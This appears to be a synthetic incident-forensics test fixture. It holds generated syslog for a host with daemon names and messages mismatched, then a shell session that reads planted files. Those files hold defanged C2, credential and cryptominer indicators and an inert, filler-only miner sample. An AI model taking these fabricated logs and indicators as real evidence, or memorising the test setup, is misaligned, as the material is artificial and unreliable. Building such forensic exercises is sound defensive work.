+Aug 15 02:26:30 ssh-prod-01 sudo[24205]: Received disconnect from 10.10.105.144 port 48767:11: disconnected by user
+Aug 15 02:27:09 ssh-prod-01 chronyd[7861]: Started Session 192 of user postgres.
+Aug 15 02:27:31 ssh-prod-01 systemd-logind[2439]: Time synchronised to time server
+Aug 15 02:27:41 ssh-prod-01 kernel[19997]: Received disconnect from 10.10.105.121 port 49486:11: disconnected by user
+Aug 15 02:28:21 ssh-prod-01 dbus-daemon[28002]: Received disconnect from 10.10.105.79 port 58937:11: disconnected by user
+Aug 15 02:29:04 ssh-prod-01 sudo[1040]: Received disconnect from 10.10.105.229 port 52478:11: disconnected by user
+Aug 15 02:29:27 ssh-prod-01 systemd[15280]: pam_unix(cron:session): session opened for user root
+Aug 15 02:29:33 ssh-prod-01 sshd[9775]: Started Session 525 of user postgres.
+Aug 15 02:30:24 ssh-prod-01 CRON[7440]: pam_unix(cron:session): session opened for user root
+Aug 15 02:31:01 ssh-prod-01 chronyd[13092]: pam_unix(cron:session): session opened for user root
+Aug 15 02:31:32 ssh-prod-01 dbus-daemon[1898]: Started Session 509 of user jenkins.
+Aug 15 02:32:23 ssh-prod-01 kernel[28885]: Received disconnect from 10.10.105.132 port 56675:11: disconnected by user
+Aug 15 02:32:53 ssh-prod-01 CRON[27632]: Time synchronised to time server
+Aug 15 02:33:23 ssh-prod-01 dbus-daemon[9657]: CPU0: Package temperature normal
+Aug 15 02:34:17 ssh-prod-01 sshd[1576]: Received disconnect from 10.10.105.65 port 53996:11: disconnected by user
+Aug 15 02:34:30 ssh-prod-01 sudo[22227]: Started Session 720 of user svc-backup.
+Aug 15 02:34:38 ssh-prod-01 sudo[11222]: CPU0: Package temperature normal
+Aug 15 02:34:43 ssh-prod-01 CRON[23932]: Received disconnect from 10.10.105.28 port 58942:11: disconnected by user
+Aug 15 02:35:38 ssh-prod-01 sshd[9564]: CPU0: Package temperature normal
+Aug 15 02:35:43 ssh-prod-01 systemd[11230]: CPU0: Package temperature normal
+Aug 15 02:36:17 ssh-prod-01 chronyd[12997]: Time synchronised to time server
+Aug 15 02:36:57 ssh-prod-01 sudo[21536]: Started Session 392 of user jenkins.
+Aug 15 02:37:48 ssh-prod-01 CRON[12239]: CPU0: Package temperature normal
+Aug 15 02:37:55 ssh-prod-01 dbus-daemon[22667]: Time synchronised to time server
+Aug 15 02:38:30 ssh-prod-01 dbus-daemon[20149]: CPU0: Package temperature normal
+Aug 15 02:38:38 ssh-prod-01 systemd[24963]: Received disconnect from 10.10.105.238 port 42266:11: disconnected by user
+Aug 15 02:39:28 ssh-prod-01 kernel[6913]: Started Session 659 of user root.
+Aug 15 02:39:51 ssh-prod-01 chronyd[20688]: Received disconnect from 10.10.105.231 port 58148:11: disconnected by user
+Aug 15 02:40:11 ssh-prod-01 kernel[25551]: Received disconnect from 10.10.105.94 port 57159:11: disconnected by user
+Aug 15 02:40:20 ssh-prod-01 dbus-daemon[20289]: Started Session 690 of user webadmin.
+Aug 15 02:40:49 ssh-prod-01 kernel[17783]: pam_unix(cron:session): session opened for user root
+Aug 15 02:40:51 ssh-prod-01 systemd[29211]: Received disconnect from 10.10.105.167 port 60107:11: disconnected by user
+Aug 15 02:41:29 ssh-prod-01 sudo[18095]: CPU0: Package temperature normal
+Aug 15 02:41:39 ssh-prod-01 CRON[19620]: Started Session 328 of user svc-backup.
+Aug 15 02:42:33 ssh-prod-01 sudo[18080]: CPU0: Package temperature normal
+Aug 15 02:42:35 ssh-prod-01 sshd[26254]: Received disconnect from 10.10.105.148 port 41721:11: disconnected by user
+Aug 15 02:42:47 ssh-prod-01 sudo[24206]: Started Session 485 of user root.
+Aug 15 02:43:22 ssh-prod-01 CRON[10271]: pam_unix(cron:session): session opened for user root
+Aug 15 02:44:14 ssh-prod-01 CRON[7685]: CPU0: Package temperature normal
+Aug 15 02:44:37 ssh-prod-01 systemd[5419]: Started Session 614 of user postgres.
+Aug 15 02:45:10 ssh-prod-01 dbus-daemon[14738]: Time synchronised to time server
+Aug 15 02:45:57 ssh-prod-01 chronyd[19174]: Time synchronised to time server
+Aug 15 02:46:14 ssh-prod-01 dbus-daemon[7168]: Started Session 279 of user devops.
+Aug 15 02:46:36 ssh-prod-01 systemd-logind[26383]: Received disconnect from 10.10.105.81 port 62582:11: disconnected by user
+Aug 15 02:47:05 ssh-prod-01 sudo[3309]: pam_unix(cron:session): session opened for user root
+Aug 15 02:47:53 ssh-prod-01 kernel[1536]: Started Session 85 of user jenkins.
+Aug 15 02:48:09 ssh-prod-01 sudo[24782]: Time synchronised to time server
+Aug 15 02:48:39 ssh-prod-01 chronyd[24233]: Started Session 649 of user devops.
+Aug 15 02:49:26 ssh-prod-01 chronyd[10797]: Time synchronised to time server
+Aug 15 02:49:30 ssh-prod-01 sshd[17356]: Time synchronised to time server
+Aug 15 02:50:00 ssh-prod-01 sudo[11070]: Time synchronised to time server
+Aug 15 02:50:33 ssh-prod-01 systemd-logind[6364]: Received disconnect from 10.10.105.153 port 57849:11: disconnected by user
+Aug 15 02:51:23 ssh-prod-01 systemd-logind[13774]: Received disconnect from 10.10.105.164 port 42428:11: disconnected by user
+Aug 15 02:51:34 ssh-prod-01 sudo[6707]: Time synchronised to time server
+Aug 15 02:51:57 ssh-prod-01 systemd-logind[16594]: Received disconnect from 10.10.105.184 port 56514:11: disconnected by user
+Aug 15 02:52:09 ssh-prod-01 systemd[4801]: Received disconnect from 10.10.105.10 port 58878:11: disconnected by user
+Aug 15 02:52:48 ssh-prod-01 chronyd[24235]: Received disconnect from 10.10.105.173 port 48454:11: disconnected by user
+Aug 15 02:53:16 ssh-prod-01 dbus-daemon[15029]: Started Session 196 of user root.
+Aug 15 02:53:22 ssh-prod-01 CRON[11735]: Received disconnect from 10.10.105.181 port 61971:11: disconnected by user
+Aug 15 02:54:16 ssh-prod-01 CRON[11022]: Started Session 861 of user devops.
+Aug 15 02:55:06 ssh-prod-01 sudo[19811]: pam_unix(cron:session): session opened for user root
+Aug 15 02:55:18 ssh-prod-01 kernel[21485]: pam_unix(cron:session): session opened for user root
+Aug 15 02:55:54 ssh-prod-01 systemd-logind[16357]: pam_unix(cron:session): session opened for user root
+Aug 15 02:55:56 ssh-prod-01 systemd-logind[712]: Started Session 347 of user jenkins.
+Aug 15 02:56:06 ssh-prod-01 dbus-daemon[23847]: Time synchronised to time server
+Aug 15 02:56:52 ssh-prod-01 sshd[18003]: Received disconnect from 10.10.105.44 port 46911:11: disconnected by user
+Aug 15 02:56:56 ssh-prod-01 kernel[784]: pam_unix(cron:session): session opened for user root
+Aug 15 02:56:57 ssh-prod-01 dbus-daemon[17546]: Time synchronised to time server
+Aug 15 02:57:07 ssh-prod-01 sshd[26182]: pam_unix(cron:session): session opened for user root
+Aug 15 02:57:33 ssh-prod-01 sudo[5491]: pam_unix(cron:session): session opened for user root
+Aug 15 02:57:50 ssh-prod-01 CRON[23497]: Received disconnect from 10.10.105.77 port 47510:11: disconnected by user
+Aug 15 02:58:16 ssh-prod-01 kernel[22260]: CPU0: Package temperature normal
+Aug 15 02:58:28 ssh-prod-01 chronyd[10596]: pam_unix(cron:session): session opened for user root
+Aug 15 02:59:00 ssh-prod-01 sshd[29923]: Time synchronised to time server
+Aug 15 02:59:10 ssh-prod-01 systemd[22692]: Received disconnect from 10.10.105.142 port 62629:11: disconnected by user
+Aug 15 02:59:28 ssh-prod-01 sudo[12827]: Time synchronised to time server
+Aug 15 02:59:33 ssh-prod-01 kernel[22180]: Started Session 996 of user webadmin.
+Aug 15 02:59:53 ssh-prod-01 kernel[19155]: CPU0: Package temperature normal
+Aug 15 03:00:47 ssh-prod-01 sudo[8711]: Started Session 939 of user devops.
+Aug 15 03:01:18 ssh-prod-01 sudo[27689]: pam_unix(cron:session): session opened for user root
+Aug 15 03:01:34 ssh-prod-01 kernel[22112]: Received disconnect from 10.10.105.63 port 64821:11: disconnected by user
+Aug 15 03:02:16 ssh-prod-01 chronyd[21649]: Received disconnect from 10.10.105.16 port 64288:11: disconnected by user
+Aug 15 03:02:33 ssh-prod-01 sudo[10378]: Time synchronised to time server
+Aug 15 03:02:53 ssh-prod-01 CRON[15650]: Started Session 568 of user webadmin.
+Aug 15 03:03:20 ssh-prod-01 kernel[8219]: Received disconnect from 10.10.105.120 port 45382:11: disconnected by user
+Aug 15 03:03:43 ssh-prod-01 chronyd[29810]: Received disconnect from 10.10.105.98 port 63150:11: disconnected by user
+Aug 15 03:04:24 ssh-prod-01 CRON[15640]: Received disconnect from 10.10.105.157 port 49187:11: disconnected by user
+Aug 15 03:04:49 ssh-prod-01 kernel[21647]: CPU0: Package temperature normal
+Aug 15 03:05:09 ssh-prod-01 sudo[29343]: Started Session 103 of user svc-backup.
+Aug 15 03:05:15 ssh-prod-01 systemd[12275]: pam_unix(cron:session): session opened for user root
+Aug 15 03:05:30 ssh-prod-01 systemd[6580]: Started Session 284 of user webadmin.
+Aug 15 03:05:51 ssh-prod-01 sudo[16614]: Received disconnect from 10.10.105.150 port 55585:11: disconnected by user
+Aug 15 03:06:02 ssh-prod-01 sudo[19418]: CPU0: Package temperature normal
+Aug 15 03:06:56 ssh-prod-01 sudo[3846]: Started Session 843 of user devops.
+Aug 15 03:07:33 ssh-prod-01 systemd[13999]: Started Session 644 of user devops.
+Aug 15 03:07:36 ssh-prod-01 CRON[5761]: Received disconnect from 10.10.105.78 port 48016:11: disconnected by user
+Aug 15 03:08:00 ssh-prod-01 dbus-daemon[21233]: Time synchronised to time server
+Aug 15 03:08:01 ssh-prod-01 sudo[1015]: Time synchronised to time server
+Aug 15 03:08:44 ssh-prod-01 sudo[1456]: Time synchronised to time server
+Aug 15 03:09:38 ssh-prod-01 CRON[23386]: CPU0: Package temperature normal
+Aug 15 03:10:15 ssh-prod-01 kernel[4715]: CPU0: Package temperature normal
+Aug 15 03:11:00 ssh-prod-01 chronyd[6065]: pam_unix(cron:session): session opened for user root
+Aug 15 03:11:09 ssh-prod-01 systemd[17190]: Time synchronised to time server
+Aug 15 03:11:55 ssh-prod-01 systemd-logind[20586]: Time synchronised to time server
+Aug 15 03:12:32 ssh-prod-01 dbus-daemon[3042]: Started Session 475 of user devops.
+Aug 15 03:12:48 ssh-prod-01 systemd[19803]: CPU0: Package temperature normal
+Aug 15 03:13:29 ssh-prod-01 sshd[29072]: pam_unix(cron:session): session opened for user root
+Aug 15 03:14:22 ssh-prod-01 sshd[26806]: Started Session 5 of user svc-backup.
+Aug 15 03:14:26 ssh-prod-01 CRON[26270]: Started Session 124 of user jenkins.
+Aug 15 03:14:51 ssh-prod-01 systemd-logind[6456]: Started Session 5 of user svc-backup.
+Aug 15 03:15:40 ssh-prod-01 kernel[20546]: CPU0: Package temperature normal
+Aug 15 03:16:23 ssh-prod-01 systemd[4498]: Started Session 308 of user postgres.
+Aug 15 03:16:42 ssh-prod-01 systemd[15635]: Received disconnect from 10.10.105.160 port 50416:11: disconnected by user
+Aug 15 03:17:31 ssh-prod-01 sudo[12599]: Time synchronised to time server
+Aug 15 03:17:41 ssh-prod-01 CRON[8583]: Started Session 117 of user postgres.
+Aug 15 03:18:12 ssh-prod-01 systemd-logind[28435]: Received disconnect from 10.10.105.38 port 54741:11: disconnected by user
+Aug 15 03:18:50 ssh-prod-01 CRON[4826]: Started Session 839 of user jenkins.
+Aug 15 03:19:35 ssh-prod-01 systemd-logind[2663]: Started Session 609 of user svc-backup.
+Aug 15 03:19:50 ssh-prod-01 dbus-daemon[2869]: Received disconnect from 10.10.105.131 port 60485:11: disconnected by user
+Aug 15 03:20:04 ssh-prod-01 sshd[21304]: CPU0: Package temperature normal
+Aug 15 03:20:42 ssh-prod-01 kernel[27225]: pam_unix(cron:session): session opened for user root
+Aug 15 03:21:27 ssh-prod-01 sudo[6127]: Started Session 112 of user webadmin.
+Aug 15 03:21:29 ssh-prod-01 systemd[27354]: Time synchronised to time server
+Aug 15 03:21:36 ssh-prod-01 dbus-daemon[8576]: Started Session 571 of user jenkins.
+Aug 15 03:22:28 ssh-prod-01 chronyd[16853]: Started Session 227 of user jenkins.
+Aug 15 03:22:31 ssh-prod-01 kernel[13174]: CPU0: Package temperature normal
+Aug 15 03:23:12 ssh-prod-01 systemd-logind[22759]: pam_unix(cron:session): session opened for user root
+Aug 15 03:23:38 ssh-prod-01 systemd[1539]: CPU0: Package temperature normal
+Aug 15 03:24:13 ssh-prod-01 sshd[4652]: Received disconnect from 10.10.105.132 port 62473:11: disconnected by user
+Aug 15 03:24:30 ssh-prod-01 dbus-daemon[1311]: CPU0: Package temperature normal
+Aug 15 03:25:08 ssh-prod-01 chronyd[9546]: Time synchronised to time server
+Aug 15 03:25:48 ssh-prod-01 systemd-logind[20152]: Started Session 58 of user jenkins.
+Aug 15 03:26:27 ssh-prod-01 dbus-daemon[1854]: Received disconnect from 10.10.105.227 port 53667:11: disconnected by user
+Aug 15 03:27:07 ssh-prod-01 kernel[3668]: Started Session 577 of user devops.
+Aug 15 03:28:00 ssh-prod-01 CRON[24546]: CPU0: Package temperature normal
+Aug 15 03:28:15 ssh-prod-01 systemd-logind[7573]: Started Session 924 of user root.
+Aug 15 03:28:26 ssh-prod-01 dbus-daemon[25005]: Started Session 632 of user devops.
+Aug 15 03:28:54 ssh-prod-01 systemd-logind[11581]: Started Session 679 of user jenkins.
+Aug 15 03:29:12 ssh-prod-01 systemd[18263]: pam_unix(cron:session): session opened for user root
+Aug 15 03:29:47 ssh-prod-01 sshd[19440]: Started Session 345 of user postgres.
+Aug 15 03:30:33 ssh-prod-01 sshd[29002]: Time synchronised to time server
+Aug 15 03:30:58 ssh-prod-01 sshd[10671]: Received disconnect from 10.10.105.213 port 42557:11: disconnected by user
+Aug 15 03:31:26 ssh-prod-01 chronyd[798]: pam_unix(cron:session): session opened for user root
+Aug 15 03:31:43 ssh-prod-01 CRON[2361]: CPU0: Package temperature normal
+Aug 15 03:31:47 ssh-prod-01 dbus-daemon[18918]: CPU0: Package temperature normal
+Aug 15 03:32:18 ssh-prod-01 chronyd[4573]: pam_unix(cron:session): session opened for user root
+Aug 15 03:32:36 ssh-prod-01 kernel[2356]: Time synchronised to time server
+Aug 15 03:32:45 ssh-prod-01 sshd[10534]: pam_unix(cron:session): session opened for user root
+Aug 15 03:33:39 ssh-prod-01 chronyd[24774]: CPU0: Package temperature normal
+Aug 15 03:33:42 ssh-prod-01 dbus-daemon[10219]: Received disconnect from 10.10.105.31 port 63164:11: disconnected by user
+Aug 15 03:34:15 ssh-prod-01 kernel[26977]: pam_unix(cron:session): session opened for user root
+Aug 15 03:34:38 ssh-prod-01 CRON[22425]: Received disconnect from 10.10.105.144 port 50399:11: disconnected by user
+Aug 15 03:34:54 ssh-prod-01 chronyd[28861]: Time synchronised to time server
+Aug 15 03:35:48 ssh-prod-01 kernel[7211]: CPU0: Package temperature normal
+Aug 15 03:36:22 ssh-prod-01 chronyd[16096]: CPU0: Package temperature normal
+Aug 15 03:36:36 ssh-prod-01 dbus-daemon[19605]: Received disconnect from 10.10.105.169 port 62960:11: disconnected by user
+Aug 15 03:37:20 ssh-prod-01 sshd[24608]: CPU0: Package temperature normal
+Aug 15 03:37:35 ssh-prod-01 systemd-logind[594]: Received disconnect from 10.10.105.35 port 41948:11: disconnected by user
+Aug 15 03:38:02 ssh-prod-01 sshd[20100]: Time synchronised to time server
+Aug 15 03:38:29 ssh-prod-01 sshd[7929]: Started Session 15 of user webadmin.
+Aug 15 03:39:07 ssh-prod-01 chronyd[19053]: pam_unix(cron:session): session opened for user root
+Aug 15 03:39:22 ssh-prod-01 sshd[29353]: Received disconnect from 10.10.105.107 port 60055:11: disconnected by user
+Aug 15 03:39:43 ssh-prod-01 chronyd[28154]: Started Session 121 of user devops.
+Aug 15 03:39:51 ssh-prod-01 sudo[15555]: Time synchronised to time server
+Aug 15 03:40:42 ssh-prod-01 systemd[10376]: CPU0: Package temperature normal
+Aug 15 03:40:56 ssh-prod-01 systemd[10257]: pam_unix(cron:session): session opened for user root
+Aug 15 03:41:41 ssh-prod-01 systemd[24642]: Started Session 167 of user svc-backup.
+Aug 15 03:42:26 ssh-prod-01 sudo[25379]: Time synchronised to time server
+Aug 15 03:42:47 ssh-prod-01 CRON[24253]: CPU0: Package temperature normal
+Aug 15 03:42:59 ssh-prod-01 sshd[28323]: CPU0: Package temperature normal
+Aug 15 03:43:08 ssh-prod-01 systemd[8196]: CPU0: Package temperature normal
+Aug 15 03:43:39 ssh-prod-01 chronyd[19798]: CPU0: Package temperature normal
+Aug 15 03:44:08 ssh-prod-01 systemd-logind[16642]: CPU0: Package temperature normal
+Aug 15 03:44:48 ssh-prod-01 systemd[11948]: Received disconnect from 10.10.105.48 port 61129:11: disconnected by user
+Aug 15 03:45:06 ssh-prod-01 systemd[1629]: Received disconnect from 10.10.105.149 port 63423:11: disconnected by user
+Aug 15 03:45:42 ssh-prod-01 kernel[10545]: CPU0: Package temperature normal
+Aug 15 03:46:16 ssh-prod-01 systemd[5540]: Time synchronised to time server
+Aug 15 03:46:35 ssh-prod-01 chronyd[13087]: CPU0: Package temperature normal
+Aug 15 03:47:29 ssh-prod-01 kernel[2284]: CPU0: Package temperature normal
+Aug 15 03:48:19 ssh-prod-01 sshd[16038]: Started Session 578 of user devops.
+Aug 15 03:49:07 ssh-prod-01 CRON[21973]: CPU0: Package temperature normal
+Aug 15 03:49:27 ssh-prod-01 kernel[10840]: Started Session 702 of user webadmin.
+Aug 15 03:50:12 ssh-prod-01 chronyd[9168]: CPU0: Package temperature normal
+Aug 15 03:51:02 ssh-prod-01 kernel[19822]: Started Session 802 of user devops.
+Aug 15 03:51:09 ssh-prod-01 sshd[27106]: CPU0: Package temperature normal
+Aug 15 03:51:56 ssh-prod-01 CRON[15640]: CPU0: Package temperature normal
+Aug 15 03:52:06 ssh-prod-01 chronyd[19506]: Received disconnect from 10.10.105.215 port 61914:11: disconnected by user
+Aug 15 03:52:54 ssh-prod-01 sudo[1766]: Time synchronised to time server
+Aug 15 03:53:02 ssh-prod-01 dbus-daemon[16568]: Started Session 91 of user root.
+Aug 15 03:53:49 ssh-prod-01 CRON[16619]: Started Session 803 of user postgres.
+Aug 15 03:54:35 ssh-prod-01 sshd[17620]: Started Session 423 of user svc-backup.
+Aug 15 03:55:24 ssh-prod-01 sshd[6607]: pam_unix(cron:session): session opened for user root
+Aug 15 03:55:39 ssh-prod-01 dbus-daemon[28471]: Received disconnect from 10.10.105.247 port 46695:11: disconnected by user
+Aug 15 03:56:03 ssh-prod-01 systemd-logind[18008]: CPU0: Package temperature normal
+Aug 15 03:56:54 ssh-prod-01 kernel[22555]: Received disconnect from 10.10.105.191 port 42234:11: disconnected by user
+Aug 15 03:57:42 ssh-prod-01 sudo[24311]: pam_unix(cron:session): session opened for user root
+Aug 15 03:58:26 ssh-prod-01 systemd-logind[28789]: Started Session 738 of user svc-backup.
+Aug 15 03:58:52 ssh-prod-01 kernel[9085]: CPU0: Package temperature normal
+Aug 15 03:59:20 ssh-prod-01 CRON[25946]: Time synchronised to time server
+Aug 15 03:59:43 ssh-prod-01 sudo[18872]: pam_unix(cron:session): session opened for user root
+Aug 15 04:00:10 ssh-prod-01 sudo[23770]: pam_unix(cron:session): session opened for user root
+Aug 15 04:00:19 ssh-prod-01 sshd[21610]: Started Session 914 of user webadmin.
+Aug 15 04:00:55 ssh-prod-01 sshd[21512]: Time synchronised to time server
+Aug 15 04:01:46 ssh-prod-01 systemd-logind[26620]: Started Session 709 of user devops.
+Aug 15 04:02:34 ssh-prod-01 sshd[19095]: CPU0: Package temperature normal
+Aug 15 04:03:24 ssh-prod-01 dbus-daemon[18219]: Received disconnect from 10.10.105.225 port 55440:11: disconnected by user
+Aug 15 04:04:05 ssh-prod-01 dbus-daemon[819]: Started Session 163 of user postgres.
+Aug 15 04:04:51 ssh-prod-01 chronyd[5747]: Started Session 796 of user root.
+Aug 15 04:04:56 ssh-prod-01 CRON[22370]: pam_unix(cron:session): session opened for user root
+Aug 15 04:05:25 ssh-prod-01 systemd-logind[18540]: Started Session 227 of user svc-backup.
+Aug 15 04:06:09 ssh-prod-01 dbus-daemon[19804]: Started Session 613 of user webadmin.
+Aug 15 04:06:58 ssh-prod-01 systemd[17224]: Started Session 633 of user root.
+Aug 15 04:07:08 ssh-prod-01 kernel[13021]: pam_unix(cron:session): session opened for user root
+Aug 15 04:07:25 ssh-prod-01 dbus-daemon[27027]: CPU0: Package temperature normal
+Aug 15 04:07:38 ssh-prod-01 chronyd[12706]: pam_unix(cron:session): session opened for user root
+Aug 15 04:08:26 ssh-prod-01 systemd[646]: Received disconnect from 10.10.105.187 port 58866:11: disconnected by user
+Aug 15 04:09:20 ssh-prod-01 sudo[23519]: Received disconnect from 10.10.105.138 port 42549:11: disconnected by user
+Aug 15 04:10:12 ssh-prod-01 CRON[27072]: Received disconnect from 10.10.105.212 port 50323:11: disconnected by user
+Aug 15 04:10:35 ssh-prod-01 kernel[29727]: Time synchronised to time server
+Aug 15 04:10:53 ssh-prod-01 chronyd[9710]: Received disconnect from 10.10.105.138 port 46728:11: disconnected by user
+Aug 15 04:11:18 ssh-prod-01 chronyd[17789]: pam_unix(cron:session): session opened for user root
+Aug 15 04:11:47 ssh-prod-01 sudo[29890]: Received disconnect from 10.10.105.240 port 42179:11: disconnected by user
+Aug 15 04:11:52 ssh-prod-01 sudo[13854]: pam_unix(cron:session): session opened for user root
+Aug 15 04:12:20 ssh-prod-01 chronyd[15445]: Started Session 950 of user svc-backup.
+Aug 15 04:12:30 ssh-prod-01 systemd-logind[20956]: Started Session 371 of user devops.
+Aug 15 04:13:01 ssh-prod-01 systemd[26894]: Time synchronised to time server
+Aug 15 04:13:16 ssh-prod-01 systemd-logind[27009]: Received disconnect from 10.10.105.53 port 56109:11: disconnected by user
+Aug 15 04:13:51 ssh-prod-01 kernel[2223]: CPU0: Package temperature normal
+Aug 15 04:14:32 ssh-prod-01 CRON[3006]: pam_unix(cron:session): session opened for user root
+Aug 15 04:15:10 ssh-prod-01 chronyd[27225]: pam_unix(cron:session): session opened for user root
+Aug 15 04:15:28 ssh-prod-01 sshd[22570]: Received disconnect from 10.10.105.132 port 46672:11: disconnected by user
+Aug 15 04:15:36 ssh-prod-01 kernel[26060]: Started Session 608 of user postgres.
+Aug 15 04:16:18 ssh-prod-01 sudo[23677]: Started Session 162 of user webadmin.
+Aug 15 04:16:27 ssh-prod-01 systemd-logind[6803]: pam_unix(cron:session): session opened for user root
+Aug 15 04:17:14 ssh-prod-01 CRON[6110]: Time synchronised to time server
+Aug 15 04:17:36 ssh-prod-01 systemd[25144]: Received disconnect from 10.10.105.95 port 41081:11: disconnected by user
+Aug 15 04:18:23 ssh-prod-01 systemd-logind[29988]: Started Session 633 of user svc-backup.
+Aug 15 04:18:28 ssh-prod-01 dbus-daemon[29949]: pam_unix(cron:session): session opened for user root
+Aug 15 04:18:46 ssh-prod-01 systemd-logind[18480]: Received disconnect from 10.10.105.4 port 48056:11: disconnected by user
+Aug 15 04:19:37 ssh-prod-01 kernel[7979]: pam_unix(cron:session): session opened for user root
+Aug 15 04:19:49 ssh-prod-01 sshd[25303]: pam_unix(cron:session): session opened for user root
+Aug 15 04:20:43 ssh-prod-01 systemd[28086]: pam_unix(cron:session): session opened for user root
+Aug 15 04:21:06 ssh-prod-01 dbus-daemon[28648]: Time synchronised to time server
+Aug 15 04:21:54 ssh-prod-01 chronyd[10144]: Time synchronised to time server
+Aug 15 04:22:27 ssh-prod-01 sshd[10219]: pam_unix(cron:session): session opened for user root
+Aug 15 04:22:42 ssh-prod-01 chronyd[29215]: Time synchronised to time server
+Aug 15 04:23:34 ssh-prod-01 systemd[1709]: Started Session 357 of user jenkins.
+Aug 15 04:24:05 ssh-prod-01 dbus-daemon[16076]: Started Session 619 of user devops.
+Aug 15 04:24:52 ssh-prod-01 systemd-logind[17963]: Started Session 232 of user root.
+Aug 15 04:25:17 ssh-prod-01 kernel[12879]: CPU0: Package temperature normal
+Aug 15 04:25:46 ssh-prod-01 chronyd[24547]: pam_unix(cron:session): session opened for user root
+Aug 15 04:26:00 ssh-prod-01 systemd[12044]: Received disconnect from 10.10.105.30 port 41165:11: disconnected by user
+Aug 15 04:26:14 ssh-prod-01 dbus-daemon[303]: Time synchronised to time server
+[?2004hroot@58bb37a3cf48:/app# file /disk/var/lib/.cache/.wiped.bin /disk/tmp/.X11-unix/.xorg
+[?2004l/disk/var/lib/.cache/.wiped.bin: data
+/disk/tmp/.X11-unix/.xorg:       ASCII text
+[?2004hroot@58bb37a3cf48:/app# cat /disk/var/lib/.cache/.wiped.bin
+[?2004lpartial recover: C2 beacon to 198.51.100.78 domain update-ssh[.]example[.]cn  ˇ˛8m¢◊Av´‡J¥ÈSàΩÚ'\ë∆˚0eöœ9n£ÿBw¨·KÄµÍTâæÛ(]í«¸1fõ–:o§ŸCx≠‚LÅ∂Î UäøÙ)^ì»˝2gú—;p•⁄DyÆ„MÇ∑Ï!Vã¿ı*_î…˛3hù“<q¶€EzØ‰NÉ∏Ì"Wå¡ˆ+`ï ˇ4iû”=rß‹F{∞ÂOÑπÓ#Xç¬˜,añÀ 5jü‘	>s®›G|±ÊPÖ∫Ô$Yé√¯-bóÃ6k†’
+?t©ﬁH}≤ÁQÜª%Zèƒ˘.còÕ7l°÷@u™ﬂI~≥ËRáºÒ&[ê≈˙/dôŒ
+credential cache fragment (defanged): administrator:<ntlm-hash-redacted>
+[?2004hroot@58bb37a3cf48:/app# cat /disk/tmp/.X11-unix/.xorg
+[?2004lSYNTHETIC-INERT-SAMPLE (miner-process) ? not a runnable executable; content defanged for a DFIR evaluation. Original was a dropped binary; compute sha256 to record its hash.
+
+xmrig-family miner process (pid 1337) mining to pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333 (defanged) ? sustained high CPU
+cryptominer binary sample dropped here; compute its sha256 hash to record the binary
+pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+wallet 4A0000000000000000000d1ec67074f7
+config.json
+
+--- pseudo hexdump (benign filler) ---
+00000000  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000010  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000020  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000030  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000040  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000050  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000060  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000070  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000080  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000090  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000000a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000000b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000000c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000000d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000000e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000000f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000100  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000110  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000120  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000130  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000140  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000150  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000160  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000170  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000180  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000190  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000001a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000001b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000001c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000001d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000001e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000001f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+[?2004hroot@58bb37a3cf48:/app# cat /disk/tmp/.X11-unix/.xorg
+[?2004lSYNTHETIC-INERT-SAMPLE (miner-process) ? not a runnable executable; content defanged for a DFIR evaluation. Original was a dropped binary; compute sha256 to record its hash.
+
+xmrig-family miner process (pid 1337) mining to pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333 (defanged) ? sustained high CPU
+cryptominer binary sample dropped here; compute its sha256 hash to record the binary
+pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+wallet 4A0000000000000000000d1ec67074f7
+config.json
+
+--- pseudo hexdump (benign filler) ---
+00000000  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000010  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000020  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000030  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
